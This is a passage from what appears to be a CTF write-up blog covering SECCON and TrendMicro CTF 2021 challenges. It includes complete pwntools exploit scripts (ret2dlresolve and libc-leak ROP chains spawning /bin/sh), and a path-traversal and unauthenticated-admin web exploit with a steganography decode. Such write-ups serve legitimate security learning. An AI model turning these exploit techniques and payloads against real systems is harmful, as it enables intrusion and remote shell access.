**kw)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># ===========================================================</span><br><span class="line">#                    EXPLOIT GOES HERE</span><br><span class="line"># ===========================================================</span><br><span class="line"># Arch:     i386-32-little</span><br><span class="line"># RELRO:    Partial RELRO</span><br><span class="line"># Stack:    No canary found</span><br><span class="line"># NX:       NX enabled</span><br><span class="line"># PIE:      No PIE (0x8048000)</span><br><span class="line"></span><br><span class="line"># Specify your GDB script here for debugging</span><br><span class="line"># GDB will be launched if the exploit is run via e.g.</span><br><span class="line"># ./exploit.py GDB</span><br><span class="line">gdbscript = &#x27;&#x27;&#x27;</span><br><span class="line">tbreak main</span><br><span class="line">continue</span><br><span class="line">&#x27;&#x27;&#x27;.format(**locals())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def log_print(*msg):</span><br><span class="line">    log.info(&quot; &quot;.join(msg))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def int2byte(x: int):</span><br><span class="line">    return x.to_bytes(0x4, &quot;little&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def wait_for_debugger(io):</span><br><span class="line">    if args.LOCAL and input(&quot;debugger?&quot;) == &quot;y\n&quot;:</span><br><span class="line">        pid = util.proc.pidof(io)[0]</span><br><span class="line">        log_print(&quot;The pid is: &quot; + str(pid))</span><br><span class="line">        util.proc.wait_for_debugger(pid)</span><br><span class="line">        log_print(&quot;press enter to continue&quot;)</span><br><span class="line"></span><br><span class="line"># binary info goes here</span><br><span class="line"></span><br><span class="line">writable_addr = 0x0804d000-0x200</span><br><span class="line">buffer_over_flow_offset = 0x80</span><br><span class="line"></span><br><span class="line">io = start()</span><br><span class="line">wait_for_debugger(io)</span><br><span class="line"></span><br><span class="line">dlresolve = Ret2dlresolvePayload(exe, symbol=&quot;system&quot;, args=[&quot;/bin/sh&quot;], data_addr=writable_addr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">exe_rop.call(&#x27;gets&#x27;, [dlresolve.data_addr])</span><br><span class="line">#exe_rop.call(&#x27;read&#x27;, [0,dlresolve.data_addr,200]) # read(0,data_addr,length)</span><br><span class="line"></span><br><span class="line">exe_rop.ret2dlresolve(dlresolve)</span><br><span class="line">raw_rop = exe_rop.chain()</span><br><span class="line"></span><br><span class="line">log_print(&quot;Create fake call stack rop&quot;)</span><br><span class="line">log_print(exe_rop.dump())</span><br><span class="line"></span><br><span class="line"># You may have to remove the ret before the rop, it depends on the machine.</span><br><span class="line"># align stack</span><br><span class="line">ret_addr = exe_rop.find_gadget([&#x27;ret&#x27;])[0]</span><br><span class="line"># buffer_over_flow_offset + rbp/ebp length</span><br><span class="line">io.sendline(fit(&#123;buffer_over_flow_offset+exe.bytes:  int2byte(ret_addr) + raw_rop&#125;))</span><br><span class="line"></span><br><span class="line">log_print(f&#x27;Sending dlresolve payload at address &#123;hex(dlresolve.data_addr)&#125;:\n&#123;hexdump(dlresolve.payload)&#125;&#x27;)</span><br><span class="line">io.sendline(dlresolve.payload)</span><br><span class="line">log_print(&quot;Get shell&quot;)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="flag-2"><a href="#flag-2" class="headerlink" title="flag"></a>flag</h2><p>SECCON{jUst_4_s1mpL3_b0f_ch4ll3ng3}</p>
<h1 id="0x4-pwn-average"><a href="#0x4-pwn-average" class="headerlink" title="0x4 pwn - average"></a>0x4 pwn - average</h1><h2 id="solution-1"><a href="#solution-1" class="headerlink" title="solution"></a>solution</h2><p>The leak here is the program can accept number larger than 16, which give me the chance to overwrite the stack by integer value. Since the list <code>A[16]</code> only have length 16.</p>
<p>However, there is a restriction that the input value can only be in the range of -123456789 - 123456789, so if we want to enter a number in the libc function, the system will call sys.exit()</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if (A[i]&lt;-123456789LL || 123456789LL&lt;A[i])</span><br><span class="line">       &#123;</span><br><span class="line">           printf(&quot;too large\n&quot;);</span><br><span class="line">           exit(0);</span><br><span class="line">       &#125;</span><br></pre></td></tr></table></figure>

<p>But, since it is Patial RERLO, we can change the address in the <code>got.exit</code></p>
<p>Steps</p>
<ol>
<li>call printf(got.printf) to get the leak of libc</li>
<li>overwrite got.exit</li>
<li>cal system(&quot;&#x2F;bin&#x2F;sh&quot;)</li>
</ol>
<h2 id="exp-py-2"><a href="#exp-py-2" class="headerlink" title="exp.py"></a>exp.py</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class BinaryInfo:</span><br><span class="line">    exe = &quot;average&quot;</span><br><span class="line">    libc = &quot;libc.so.6&quot;</span><br><span class="line">    # libc = &quot;/usr/lib/x86_64-linux-gnu/libc-2.31.so&quot;</span><br><span class="line"></span><br><span class="line">    host = &quot;average.quals.seccon.jp&quot;</span><br><span class="line">    port = 1234</span><br><span class="line"></span><br><span class="line">if args.LOCAL:</span><br><span class="line">    BinaryInfo.libc = &quot;/usr/lib/x86_64-linux-gnu/libc-2.31.so&quot;</span><br><span class="line"></span><br><span class="line"># Set up pwntools for the correct architecture</span><br><span class="line">exe = context.binary = ELF(BinaryInfo.exe)</span><br><span class="line">exe_rop = ROP(exe)</span><br><span class="line">if BinaryInfo.libc != &quot;&quot;:</span><br><span class="line">    libc = ELF(BinaryInfo.libc)</span><br><span class="line">    libc_rop = ROP(libc)</span><br><span class="line">else:</span><br><span class="line">    libc = None</span><br><span class="line">    libc_rop = None</span><br><span class="line"></span><br><span class="line"># Many built-in settings can be controlled on the command-line and show up</span><br><span class="line"># in &quot;args&quot;.  For example, to dump all data sent/received, and disable ASLR</span><br><span class="line"># for all created processes...</span><br><span class="line"># ./exploit.py DEBUG NOASLR</span><br><span class="line"># ./exploit.py GDB HOST=example.com PORT=4141</span><br><span class="line">host = args.HOST or BinaryInfo.host</span><br><span class="line">port = int(args.PORT or BinaryInfo.port)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def start_local(argv=[], *a, **kw):</span><br><span class="line">    &#x27;&#x27;&#x27;Execute the target binary locally&#x27;&#x27;&#x27;</span><br><span class="line">    if args.GDB:</span><br><span class="line">        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)</span><br><span class="line">    else:</span><br><span class="line">        return process([exe.path] + argv, *a, **kw)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def start_remote(argv=[], *a, **kw):</span><br><span class="line">    &#x27;&#x27;&#x27;Connect to the process on the remote host&#x27;&#x27;&#x27;</span><br><span class="line">    io = connect(host, port)</span><br><span class="line">    if args.GDB:</span><br><span class="line">        gdb.attach(io, gdbscript=gdbscript)</span><br><span class="line">    return io</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def start(argv=[], *a, **kw):</span><br><span class="line">    &#x27;&#x27;&#x27;Start the exploit against the target.&#x27;&#x27;&#x27;</span><br><span class="line">    if args.LOCAL:</span><br><span class="line">        return start_local(argv, *a, **kw)</span><br><span class="line">    else:</span><br><span class="line">        return start_remote(argv, *a, **kw)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># ===========================================================</span><br><span class="line">#                    EXPLOIT GOES HERE</span><br><span class="line"># ===========================================================</span><br><span class="line"># Arch:     Rua</span><br><span class="line"># RELRO:    Rua</span><br><span class="line"># Stack:    Rua</span><br><span class="line"># NX:       Rua</span><br><span class="line"># PIE:      Rua</span><br><span class="line"></span><br><span class="line"># Specify your GDB script here for debugging</span><br><span class="line"># GDB will be launched if the exploit is run via e.g.</span><br><span class="line"># ./exploit.py GDB</span><br><span class="line">gdbscript = &#x27;&#x27;&#x27;</span><br><span class="line">tbreak main</span><br><span class="line">continue</span><br><span class="line">&#x27;&#x27;&#x27;.format(**locals())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def log_print(*msg):</span><br><span class="line">    log.info(&quot; &quot;.join(msg))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def int2byte(x: int):</span><br><span class="line">    return x.to_bytes(exe.bytes, &quot;little&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def wait_for_debugger(io):</span><br><span class="line">    if args.LOCAL and input(&quot;debugger?&quot;) == &quot;y\n&quot;:</span><br><span class="line">        pid = util.proc.pidof(io)[0]</span><br><span class="line">        log_print(&quot;The pid is: &quot; + str(pid))</span><br><span class="line">        util.proc.wait_for_debugger(pid)</span><br><span class="line">        log_print(&quot;press enter to continue&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># ======== gadget stuff =========</span><br><span class="line">ret_addr = exe_rop.find_gadget([&#x27;ret&#x27;])[0]</span><br><span class="line">pop_rdi_ret_addr = exe_rop.find_gadget([&#x27;pop rdi&#x27;, &#x27;ret&#x27;])[0]</span><br><span class="line">log_print(&quot;pop rdi; ret&quot;, hex(pop_rdi_ret_addr))</span><br><span class="line">pop_rsi_r15_ret_addr = exe_rop.find_gadget([&#x27;pop rsi&#x27;, &#x27;pop r15&#x27;, &#x27;ret&#x27;])[0]</span><br><span class="line">log_print(&quot;pop rsi; pop r15; ret&quot;, hex(pop_rsi_r15_ret_addr))</span><br><span class="line"># ============================</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># ======== libc stuff =========</span><br><span class="line">libc_bin_sh_offset = next(libc.search(b&quot;/bin/sh&quot;))</span><br><span class="line">log_print(&quot;libc /bin/sh offset&quot;, hex(libc_bin_sh_offset))</span><br><span class="line">libc_printf_offset = libc.sym[&quot;printf&quot;]</span><br><span class="line">log_print(&quot;libc printf offset&quot;, hex(libc_printf_offset))</span><br><span class="line">libc_system_offset = libc.sym[&quot;system&quot;]</span><br><span class="line">log_print(&quot;libc system offset&quot;, hex(libc_system_offset))</span><br><span class="line"># ============================</span><br><span class="line"></span><br><span class="line"># ======== binary stuff =========</span><br><span class="line">main_addr = exe.sym[&quot;main&quot;]</span><br><span class="line">log_print(&quot;main addr&quot;, hex(main_addr))</span><br><span class="line">str_lld_addr = next(exe.search(b&quot;%lld&quot;))</span><br><span class="line">log_print(&quot;str.%lld addr&quot;, hex(str_lld_addr))</span><br><span class="line"># ============================</span><br><span class="line"></span><br><span class="line"># ======== plt stuff =========</span><br><span class="line">plt_printf_addr = exe.plt[&#x27;printf&#x27;]</span><br><span class="line">log_print(&quot;plt.printf addr&quot;, hex(plt_printf_addr))</span><br><span class="line">plt_scanf_addr = exe.plt[&#x27;__isoc99_scanf&#x27;]</span><br><span class="line">log_print(&quot;plt.scanf addr&quot;, hex(plt_scanf_addr))</span><br><span class="line"># ============================</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># ======== GOT stuff =========</span><br><span class="line">got_printf_addr = exe.got[&#x27;printf&#x27;]</span><br><span class="line">log_print(&quot;got.printf addr&quot;, hex(got_printf_addr))</span><br><span class="line">got_exit_addr = exe.got[&#x27;exit&#x27;]</span><br><span class="line">log_print(&quot;got.exit addr&quot;, hex(got_exit_addr))</span><br><span class="line"># ============================</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># ======== stack stuff =========</span><br><span class="line"># stack = flat(&#123;</span><br><span class="line">#     0x0: [</span><br><span class="line">#         b&quot;AAAA&quot;,</span><br><span class="line">#         0xaaaa,</span><br><span class="line">#         b&quot;AAAA&quot;,</span><br><span class="line">#     ],</span><br><span class="line">#     0x100: b&quot;BBBB&quot;,</span><br><span class="line">#     0x200: 0xbbbb,</span><br><span class="line"># &#125;,filler=b&#x27;\x00&#x27;,length=0x500)</span><br><span class="line"># ============================</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">writable_addr = 0x404700</span><br><span class="line"></span><br><span class="line">io = start()</span><br><span class="line">wait_for_debugger(io)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># ======== pipline stuff =========</span><br><span class="line"># io.send(b&quot;aaaa&quot;)</span><br><span class="line"># io.sendline(b&quot;aaaa&quot;)</span><br><span class="line"># io.sendlineafter(b&quot;A: &quot;, b&quot;%d&quot; % 1)</span><br><span class="line">#</span><br><span class="line"># io.recv()</span><br><span class="line"># io.recvuntil(b&quot;A: &quot;)</span><br><span class="line"># ============================</span><br><span class="line"></span><br><span class="line">def main_list_length(payload):</span><br><span class="line">    return 20 + len(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def main_sender(io, payload):</span><br><span class="line">    length = main_list_length(payload)</span><br><span class="line">    for i in range(length):</span><br><span class="line">        if i == 16:</span><br><span class="line">            io.sendlineafter(b&quot;A[%d]: &quot; % i, b&quot;%d&quot; % length)</span><br><span class="line">            continue</span><br><span class="line">        if i == 19:</span><br><span class="line">            io.sendlineafter(b&quot;A[%d]: &quot; % i, b&quot;%d&quot; % 19)</span><br><span class="line">            continue</span><br><span class="line">        if i &gt;= 20:</span><br><span class="line">            io.sendlineafter(b&quot;A[%d]: &quot; % i, b&quot;%d&quot; % payload[i - 20])</span><br><span class="line">            continue</span><br><span class="line">        io.sendlineafter(b&quot;A[%d]: &quot; % i, b&quot;%d&quot; % ord(&quot;a&quot;))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># print got.printf, get real address for printf, use this to get libc_base</span><br><span class="line">log_print(&quot;Sending first paylaod, get real address for printf, use this to get libc_base&quot;)</span><br><span class="line">payload1 = [writable_addr,</span><br><span class="line">            ret_addr,</span><br><span class="line">            pop_rdi_ret_addr,</span><br><span class="line">            got_printf_addr,</span><br><span class="line">            plt_printf_addr,</span><br><span class="line">            ret_addr,</span><br><span class="line">            main_addr]</span><br><span class="line">io.sendlineafter(b&quot;n: &quot;, b&quot;%d&quot; % main_list_length(payload1))</span><br><span class="line">main_sender(io, payload1)</span><br><span class="line"></span><br><span class="line"># print(io.recv())</span><br><span class="line">io.recvuntil(b&quot;\n&quot;)</span><br><span class="line">val = io.recvuntil(b&quot;n:&quot;)[:-2:]</span><br><span class="line">io.recv()</span><br><span class="line"></span><br><span class="line">libc_printf_addr = int.from_bytes(val, &quot;little&quot;)</span><br><span class="line">log_print(&quot;printf libc addr&quot;, hex(libc_printf_addr))</span><br><span class="line">libc_base_addr = libc_printf_addr - libc_printf_offset</span><br><span class="line">log_print(&quot;libc base addr&quot;, hex(libc_base_addr))</span><br><span class="line">libc_bin_sh_addr = libc_base_addr + libc_bin_sh_offset</span><br><span class="line">log_print(&quot;libc bin/sh addr&quot;, hex(libc_bin_sh_addr))</span><br><span class="line">libc_system_addr = libc_base_addr + libc_system_offset</span><br><span class="line">log_print(&quot;libc system addr&quot;, hex(libc_system_addr))</span><br><span class="line"></span><br><span class="line"># Sending first paylaod, change address in got.exit to printf real addressf so exit(0) not quit the program</span><br><span class="line">log_print(&quot;run main again\nSending second paylaod, change address in got.exit to got.printf so exit(0) not quit the program&quot;)</span><br><span class="line"># Sending first paylaod, use scanf(&quot;%lld&quot;,got_exit_addr) to change got.exit to printf real address</span><br><span class="line">payload2 = [writable_addr,</span><br><span class="line">            ret_addr,</span><br><span class="line">            pop_rdi_ret_addr,</span><br><span class="line">            str_lld_addr,</span><br><span class="line">            pop_rsi_r15_ret_addr,</span><br><span class="line">            got_exit_addr,</span><br><span class="line">            0,</span><br><span class="line">            ret_addr,</span><br><span class="line">            plt_scanf_addr,</span><br><span class="line">            ret_addr,</span><br><span class="line">            main_addr]</span><br><span class="line"></span><br><span class="line">io.sendline(b&quot;%d&quot; % main_list_length(payload2))</span><br><span class="line">main_sender(io, payload2)</span><br><span class="line">io.recv()</span><br><span class="line"># Sending printf real address</span><br><span class="line">io.sendline(b&quot;%d&quot; % libc_printf_addr)</span><br><span class="line"></span><br><span class="line">log_print(&quot;run main again\nSending third paylaod, call system(&#x27;/bin/sh&#x27;)&quot;)</span><br><span class="line">payload3 = [writable_addr,</span><br><span class="line">            ret_addr,</span><br><span class="line">            pop_rdi_ret_addr,</span><br><span class="line">            libc_bin_sh_addr,</span><br><span class="line">            libc_system_addr]</span><br><span class="line"></span><br><span class="line">io.sendlineafter(b&quot;n: &quot;, b&quot;%d&quot;%main_list_length(payload3))</span><br><span class="line">main_sender(io,payload3)</span><br><span class="line">log_print(&quot;get shell&quot;)</span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="flag-3"><a href="#flag-3" class="headerlink" title="flag"></a>flag</h2><p>SECCON{M4k3_My_4bi1i7i3s_4v3r4g3_in_7h3_N3x7_Lif3_cpwWz9jpoCmKYBvf}</p>
]]></content>
  </entry>
  <entry>
    <title>TrendMicro CTF 2021</title>
    <url>/ctf-writeup/2021/trendmicroctf/index.html</url>
    <content><![CDATA[<h1 id="TrendMicro-CTF-2021"><a href="#TrendMicro-CTF-2021" class="headerlink" title="TrendMicro CTF 2021"></a>TrendMicro CTF 2021</h1><h1 id="Rank"><a href="#Rank" class="headerlink" title="Rank"></a>Rank</h1><h1 id="Challenges"><a href="#Challenges" class="headerlink" title="Challenges"></a>Challenges</h1><ul>
<li><a href="./trendmicro-2021-osint2-400">OSINT2</a></li>
<li><a href="./trendmirco-2021-rev-1-100-PyPuzzle">PyPuzzle</a></li>
</ul>
]]></content>
  </entry>
  <entry>
    <title>[Trendmicro 2021] OSINTⅡ 400</title>
    <url>/ctf-writeup/2021/trendmicroctf/trendmicro-2021-osint2-400.html</url>
    <content><![CDATA[<p><strong>main concept: code review, image stego, web, zero-width Steganography</strong></p>
<h1 id="tl-dr"><a href="#tl-dr" class="headerlink" title="tl;dr"></a>tl;dr</h1><p>missing</p>
<p>The challenge came along with a <code>README.txt</code>, <code>advisories.png</code>, and <code>pwnconfig-1.0.jar</code>.</p>
<p>The challenge url is <code>http://pwnieconfig.tmctf.trendmicro.com</code> </p>
<h1 id="information"><a href="#information" class="headerlink" title="information"></a>information</h1><p>The <code>README.txt</code> file is clearly encode in the hex, read the file and convert hex to bytes, we got the following information.</p>
<span id="more"></span>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;README.txt&quot;</span>,<span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(f.read()).decode())</span><br></pre></td></tr></table></figure>

<p>the message tell us the bug only found in v1.0. However the website that challenge provide with us is v2.0. So, need to find a way to access v1.0.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Advisory Date: Sept. 18th 2021</span><br><span class="line"></span><br><span class="line">Dear Pwnieconfig Users,</span><br><span class="line"></span><br><span class="line">A security update v2.0 has been published for Pwnieconfig. Please find attached the corresponding Pwnieconfig Security Advisory document.</span><br><span class="line">Pwnieconfig v1.0 will reach end of life in 36hrs but until then, it has been archived so that you may still access your configuration files.</span><br><span class="line">As part of our transparency policy, we have provided a lightweight model of the vulnerable version.</span><br><span class="line"></span><br><span class="line">Cheers,</span><br><span class="line">Pwnieconfig Team</span><br></pre></td></tr></table></figure>

<p>After using dirmap to find possible entry of v1.0, I give up and decide to start code review.</p>
<h1 id="code-review"><a href="#code-review" class="headerlink" title="code review"></a>code review</h1><p>open <code>pwnieconfig-1.0.jar</code></p>
<p>There are some easily spotted exploits.</p>
<p><strong>Admin backend -  login with out password</strong></p>
<p><img data-src="/./images/trendmicro-2021-osint2-400/Untitled.png" alt="Untitled"></p>
<p><strong>filename is used directly in the combination of file path</strong></p>
<ul>
<li>download file from upper directory using <code>../</code></li>
</ul>
<p><img data-src="/./images/trendmicro-2021-osint2-400/Untitled1.png" alt="Untitled"></p>
<p><strong>configBase also combine directly with the directory</strong></p>
<ul>
<li>list upper level directory using <code>../</code></li>
</ul>
<p><img data-src="/./images/trendmicro-2021-osint2-400/Untitled2.png" alt="Untitled"></p>
<h1 id="stego"><a href="#stego" class="headerlink" title="stego"></a>stego</h1><p>@Filip do the stego on the <code>advisories.png</code> and found two important information, the v1.0 are deployed in the <code>archive</code> subdomain. And the flag is encrypted using zero-width steganography.</p>
<p><img data-src="/./images/trendmicro-2021-osint2-400/Untitled3.png" alt="Untitled"></p>
<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><p>use <code>archive.pwnieconfig.tmctf.trendmicro.com</code> to access v1.0 web with security issues.</p>
<p>using admin backend, we got the username and password (jeoqj&#x2F;hisgqjqlcg)</p>
<p><img data-src="/./images/trendmicro-2021-osint2-400/Untitled4.png" alt="Untitled"></p>
<p>then login the system, find the flag file location using <code>list?configBase=../</code> and download the java class file <code>http://archive.pwnieconfig.tmctf.trendmicro.com/download?id=-1&amp;filename=../RetrieveFlag.class</code></p>
<p><img data-src="/./images/trendmicro-2021-osint2-400/Untitled5.png" alt="Untitled"></p>
<p>after decompile the java class file. we get the flag content whiich is locate at <code>/view/3ec4e19a-2a70-4aac-9893-ac3712473928/b64content</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// </span><br><span class="line">// Decompiled by Procyon v0.5.36</span><br><span class="line">// </span><br><span class="line"></span><br><span class="line">package com.tmctf.pwnieconfig.flag;</span><br><span class="line"></span><br><span class="line">import org.springframework.web.bind.annotation.ResponseBody;</span><br><span class="line">import org.springframework.web.bind.annotation.GetMapping;</span><br><span class="line">import java.io.IOException;</span><br><span class="line">import java.util.Base64;</span><br><span class="line">import java.io.Reader;</span><br><span class="line">import java.io.BufferedReader;</span><br><span class="line">import java.io.InputStreamReader;</span><br><span class="line">import org.springframework.stereotype.Controller;</span><br><span class="line"></span><br><span class="line">@Controller</span><br><span class="line">public class RetrieveFlag</span><br><span class="line">&#123;</span><br><span class="line">    @GetMapping(&#123; &quot;/view/3ec4e19a-2a70-4aac-9893-ac3712473928/b64content&quot; &#125;)</span><br><span class="line">    @ResponseBody</span><br><span class="line">    public String content() throws IOException &#123;</span><br><span class="line">        final String note_fyi = &quot;TrendCTF requires flag format&quot;;</span><br><span class="line">        note_fyi.concat(&quot;to be formatted as TMCTF&#123;flag&#125;.&quot;);</span><br><span class="line">        note_fyi.concat(&quot;Keep this in mind!&quot;);</span><br><span class="line">        String b64_flag = &quot;&quot;;</span><br><span class="line">        final String salt = &quot;ac3712473928&quot;;</span><br><span class="line">        final ProcessBuilder pb = new ProcessBuilder(new String[] &#123; &quot;python&quot;, System.getProperty(&quot;user.dir&quot;) + &quot;/4aac-9893/decoder.py&quot;, salt &#125;);</span><br><span class="line">        final Process process = pb.start();</span><br><span class="line">        final BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));</span><br><span class="line">        final StringBuilder builder = new StringBuilder();</span><br><span class="line">        builder.append(reader.read());</span><br><span class="line">        b64_flag = Base64.getEncoder().encodeToString(builder.toString().getBytes());</span><br><span class="line">        return b64_flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>after open the link. the webpage return a very long base64 string.</p>
<p>decode base64 string will get a string which encrypted with zero-width stego.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">data = <span class="string">&quot;SGVsbG8sIOKAjOKAi+KAjOKAi+KAjOKAi+KAjOKAjOKAjeKAjOKAi+KAjOKAjOKAi+KAi+KAjOKAi1RyZW5kTWljcm8g4oCN4oCM4oCL4oCM4oCM4oCM4oCM4oCL4oCL4oCN4oCM4oCL4oCM4oCL4oCM4oCL4oCMQ1RGIOKAjOKAjeKAjOKAi+KAjOKAjOKAjOKAi+KAi+KAjOKAjeKAjOKAi+KAi+KAi+KAi+KAjHJlcXVpcmVzIOKAi+KAi+KAjeKAjOKAi+KAjOKAjOKAi+KAjOKAi+KAjOKAjeKAjOKAi+KAi+KAjOKAjHRoZSDigIzigIzigIvigI3igIzigIvigIvigIvigIzigIvigIvigIzigI3igIzigIvigIzigIxmbGFnIOKAjOKAjOKAjOKAjOKAjeKAjOKAi+KAjOKAi+KAjOKAi+KAi+KAi+KAjeKAjOKAi+KAi3RvIOKAjOKAjOKAi+KAjOKAi+KAjeKAjOKAi+KAi+KAjOKAjOKAjOKAi+KAjOKAjeKAjOKAi2JlIOKAjOKAjOKAjOKAjOKAjOKAi+KAjeKAjOKAi+KAi+KAi+KAjOKAjOKAjOKAjOKAjeKAjGluIOKAi+KAi+KAi+KAjOKAjOKAjOKAjOKAjeKAjOKAi+KAjOKAi+KAjOKAjOKAi+KAi+KAjXRoZSDigIzigIvigIvigIvigIzigIzigIzigIzigI3igIzigIvigIvigIzigIvigIvigIzigIxmb3JtYXQg4oCN4oCM4oCM4oCL4oCL4oCM4oCM4oCM4oCM4oCN4oCM4oCL4oCL4oCM4oCL4oCM4oCMVE1DVEZ7ZmxhZ30uIOKAi+KAjeKAjOKAi+KAi+KAi+KAjOKAi+KAjOKAjOKAjeKAjOKAi+KAi+KAi+KAi+KAjERvIOKAi+KAjOKAjeKAjOKAi+KAjOKAjOKAjOKAjOKAi+KAi+KAjeKAjOKAi+KAi+KAjOKAi3lvdSDigIzigIzigIzigI3igIzigIzigIvigIvigIzigIvigIzigIzigI3igIzigIvigIvigIxzZWUg4oCL4oCM4oCM4oCL4oCN4oCM4oCL4oCL4oCM4oCL4oCL4oCL4oCM4oCN4oCM4oCL4oCM4oCL4oCL4oCM4oCL4oCM4oCN4oCM4oCL4oCL4oCL4oCL4oCL4oCM4oCLaXQ/IA==&quot;</span></span><br></pre></td></tr></table></figure>

<p>note that every 8 unicode character is separate by <code>&quot;\u200d&quot;</code> </p>
<p>so separate characters by <code>&quot;\u200d&quot;</code> and replace <code>&quot;\u200c&quot;</code> with 0 and <code>&quot;\u200b&quot;</code> with 1. we get the flag</p>
<p><img data-src="/./images/trendmicro-2021-osint2-400/Untitled6.png" alt="Untitled"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">data = <span class="string">&quot;SGVsbG8sIOKAjOKAi+KAjOKAi+KAjOKAi+KAjOKAjOKAjeKAjOKAi+KAjOKAjOKAi+KAi+KAjOKAi1RyZW5kTWljcm8g4oCN4oCM4oCL4oCM4oCM4oCM4oCM4oCL4oCL4oCN4oCM4oCL4oCM4oCL4oCM4oCL4oCMQ1RGIOKAjOKAjeKAjOKAi+KAjOKAjOKAjOKAi+KAi+KAjOKAjeKAjOKAi+KAi+KAi+KAi+KAjHJlcXVpcmVzIOKAi+KAi+KAjeKAjOKAi+KAjOKAjOKAi+KAjOKAi+KAjOKAjeKAjOKAi+KAi+KAjOKAjHRoZSDigIzigIzigIvigI3igIzigIvigIvigIvigIzigIvigIvigIzigI3igIzigIvigIzigIxmbGFnIOKAjOKAjOKAjOKAjOKAjeKAjOKAi+KAjOKAi+KAjOKAi+KAi+KAi+KAjeKAjOKAi+KAi3RvIOKAjOKAjOKAi+KAjOKAi+KAjeKAjOKAi+KAi+KAjOKAjOKAjOKAi+KAjOKAjeKAjOKAi2JlIOKAjOKAjOKAjOKAjOKAjOKAi+KAjeKAjOKAi+KAi+KAi+KAjOKAjOKAjOKAjOKAjeKAjGluIOKAi+KAi+KAi+KAjOKAjOKAjOKAjOKAjeKAjOKAi+KAjOKAi+KAjOKAjOKAi+KAi+KAjXRoZSDigIzigIvigIvigIvigIzigIzigIzigIzigI3igIzigIvigIvigIzigIvigIvigIzigIxmb3JtYXQg4oCN4oCM4oCM4oCL4oCL4oCM4oCM4oCM4oCM4oCN4oCM4oCL4oCL4oCM4oCL4oCM4oCMVE1DVEZ7ZmxhZ30uIOKAi+KAjeKAjOKAi+KAi+KAi+KAjOKAi+KAjOKAjOKAjeKAjOKAi+KAi+KAi+KAi+KAjERvIOKAi+KAjOKAjeKAjOKAi+KAjOKAjOKAjOKAjOKAi+KAi+KAjeKAjOKAi+KAi+KAjOKAi3lvdSDigIzigIzigIzigI3igIzigIzigIvigIvigIzigIvigIzigIzigI3igIzigIvigIvigIxzZWUg4oCL4oCM4oCM4oCL4oCN4oCM4oCL4oCL4oCM4oCL4oCL4oCL4oCM4oCN4oCM4oCL4oCM4oCL4oCL4oCM4oCL4oCM4oCN4oCM4oCL4oCL4oCL4oCL4oCL4oCM4oCLaXQ/IA==&quot;</span></span><br><span class="line">data1 = base64.b64decode(data)</span><br><span class="line">a = data1.decode()</span><br><span class="line"><span class="comment"># remove standard unicode character</span></span><br><span class="line"><span class="keyword">for</span> s <span class="keyword">in</span> a:</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">ord</span>(s) &gt; <span class="number">128</span>:</span><br><span class="line">        uns.append(s)</span><br><span class="line">unss = <span class="string">&quot;&quot;</span>.join(uns)</span><br><span class="line">uns1 = unss.split(<span class="string">&quot;\u200d&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(uns1),uns1,unss.count(<span class="string">&quot;\u200d&quot;</span>))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">replacer</span>(<span class="params">s:<span class="built_in">str</span></span>):</span><br><span class="line">    <span class="keyword">return</span> s.replace(<span class="string">&quot;\u200c&quot;</span>,<span class="string">&quot;0&quot;</span>).replace(<span class="string">&quot;\u200b&quot;</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> s <span class="keyword">in</span> uns1:</span><br><span class="line">    sss = replacer(s)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="built_in">int</span>(sss,<span class="number">2</span>)),end=<span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># TMCTF&#123;Jav@WebAppSpl0itzCh4inZ&#125;</span></span><br></pre></td></tr></table></figure>
]]></content>
  </entry>
  <entry>
    <title>trendmirco 2021 rev 1 100 PyPuzzle</title>
    <url>/ctf-writeup/2021/trendmicroctf/trendmirco-2021-rev-1-100-PyPuzzle.html</url>
    <content><![CDATA[<p><strong>Main concept: how to decompile pyinstaller program</strong></p>
<p>First, this is a typical pyinstaller program.</p>
